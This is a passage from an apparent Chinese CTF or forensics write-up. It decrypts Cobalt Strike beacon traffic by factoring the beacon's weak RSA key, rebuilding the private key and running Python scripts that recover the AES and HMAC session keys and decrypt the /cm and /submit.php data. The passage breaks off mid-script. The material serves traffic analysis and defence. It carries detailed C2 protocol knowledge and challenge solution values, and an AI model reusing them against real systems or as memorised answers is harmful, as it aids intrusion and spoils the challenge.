其实是上图第三步中Beacon随机生成的URL地址</p><p>并且结合文章中中的计算方法 <code>(ord('m')+ord('B')+ord('9')+ord('u')) % 256 = 93</code></p><p>可以找到受害者的主机是64位的(上面结果如果是92对应32位，93则对应64位)</p><p>然后我们跟着参考文章中的，使用 <a href=https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py target=_blank rel="external nofollow noopener noreferrer">1768.py</a> 去解析题目中给我们的 Beacon 文件</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250226235842380.png alt=/posts/f002407/imgs/image-20250226235842380.png height=1528 width=2560></p><p>我们可以在解析结果中得到公钥，用CyberChef转换一下，并补上PEM的开头和结尾</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227000008671.png alt=/posts/f002407/imgs/image-20250227000008671.png height=1005 width=2556></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN PUBLIC KEY-----
</span></span><span class=line><span class=cl>MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahxXKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
</span></span><span class=line><span class=cl>-----END PUBLIC KEY-----</span></span></code></pre></td></tr></table></div></div><p>然后我们手动解析一下公钥，并尝试分解一下n</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227000147085.png alt=/posts/f002407/imgs/image-20250227000147085.png height=636 width=1734></p><p>发现<code>yafu</code>可以分解 n 得到 p 和 q</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227000303830.png alt=/posts/f002407/imgs/image-20250227000303830.png height=854 width=2560></p><p>我们使用<code>rsatool.py</code>结合得到的 p 和 q 生成一下PEM格式的私钥</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227000531067.png alt=/posts/f002407/imgs/image-20250227000531067.png height=1237 width=2560></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
</span></span><span class=line><span class=cl>FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span><span class=line><span class=cl>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
</span></span><span class=line><span class=cl>gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
</span></span><span class=line><span class=cl>I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
</span></span><span class=line><span class=cl>pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
</span></span><span class=line><span class=cl>qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
</span></span><span class=line><span class=cl>fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
</span></span><span class=line><span class=cl>PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
</span></span><span class=line><span class=cl>dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
</span></span><span class=line><span class=cl>Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
</span></span><span class=line><span class=cl>p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
</span></span><span class=line><span class=cl>xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----</span></span></code></pre></td></tr></table></div></div><p>然后后续的步骤就和常规的CobalStrike流量分析一样了</p><p>首先使用私钥去解密心跳包中的cookie信息得到<code>AES_KEY</code>和<code>HMAC_KEY</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>privateKey</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=s1>MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
</span></span></span><span class=line><span class=cl><span class=s1>FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span></span><span class=line><span class=cl><span class=s1>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
</span></span></span><span class=line><span class=cl><span class=s1>gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
</span></span></span><span class=line><span class=cl><span class=s1>I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
</span></span></span><span class=line><span class=cl><span class=s1>pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
</span></span></span><span class=line><span class=cl><span class=s1>qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
</span></span></span><span class=line><span class=cl><span class=s1>fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
</span></span></span><span class=line><span class=cl><span class=s1>PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
</span></span></span><span class=line><span class=cl><span class=s1>dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
</span></span></span><span class=line><span class=cl><span class=s1>Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
</span></span></span><span class=line><span class=cl><span class=s1>p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
</span></span></span><span class=line><span class=cl><span class=s1>xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
</span></span></span><span class=line><span class=cl><span class=s1>-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>publicKey</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s1>MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N
</span></span></span><span class=line><span class=cl><span class=s1>d+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span></span><span class=line><span class=cl><span class=s1>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAE=
</span></span></span><span class=line><span class=cl><span class=s1>-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_AES_HMAC_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=p>,</span><span class=n>encode_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 提取协商密钥和主机信息</span>
</span></span><span class=line><span class=cl>    <span class=n>private_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encode_data</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\xBE\xEF</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_keys</span> <span class=o>=</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_hash256</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>raw_aes_keys</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>aes_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>hmac_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span> <span class=c1># 主机信息</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_data</span> <span class=o>=</span> <span class=s2>&#34;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>get_AES_HMAC_key</span><span class=p>(</span><span class=n>privateKey</span><span class=p>,</span><span class=n>cookie_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AES key: </span><span class=si>{</span><span class=n>SHARED_KEY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;HMAC key: </span><span class=si>{</span><span class=n>HMAC_KEY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..</span>
</span></span><span class=line><span class=cl><span class=c1># 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..</span>
</span></span><span class=line><span class=cl><span class=c1># 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w</span>
</span></span><span class=line><span class=cl><span class=c1># 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R</span>
</span></span><span class=line><span class=cl><span class=c1># 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin</span>
</span></span><span class=line><span class=cl><span class=c1># 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac</span>
</span></span><span class=line><span class=cl><span class=c1># 00000060: 74 2E 65 78 65                                    t.exe</span>
</span></span><span class=line><span class=cl><span class=c1># AES key: 9fe14473479a283821241e2af78017e8</span>
</span></span><span class=line><span class=cl><span class=c1># HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d</span></span></span></code></pre></td></tr></table></div></div><p>然后使用得到到AES_KEY和HMAC_KEY去解密CS传输的数据</p><blockquote><p>Tips:</p><p>/cm：心跳包主要用于C2服务端要求客户端执行命令</p><p>/submit.php：主要用于传输客户端回传的执行结果</p></blockquote><p><strong>解密心跳包中传输的数据</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 数据总长度为：</span><span class=si>{</span><span class=n>encrypt_data_length</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>pcapng_data</span> <span class=o>=</span> <span class=n>dec</span><span class=p>[</span><span class=mi>64</span><span class=p>:</span><span class=o>-</span><span class=mi>60</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;out.pcapng&#34;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>pcapng_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>pcapng_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># output = dec[12:int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)].decode(&#39;gbk&#39;,errors=&#39;ignore&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(output)</span></span></span></code></pre></td></tr></table></div></div><p><strong>解密submit.php中回传的数据</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
